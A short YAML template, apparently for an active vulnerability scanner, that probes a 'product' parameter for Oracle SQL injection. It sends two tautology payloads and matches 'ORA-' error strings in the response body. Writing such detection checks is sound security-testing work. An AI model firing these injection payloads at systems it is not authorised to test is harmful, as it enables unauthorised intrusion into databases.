id: sqli6-oracle-28
name: 'SQLi oracle probe in product'
severity: high
type: active
tags:
  - sqli
  - injection
  - oracle
description: 'Triggers oracle error via product'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      product:
        - '1''||''1''=''1'
        - '" OR "1"="1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'ORA-'
          - 'Oracle error'
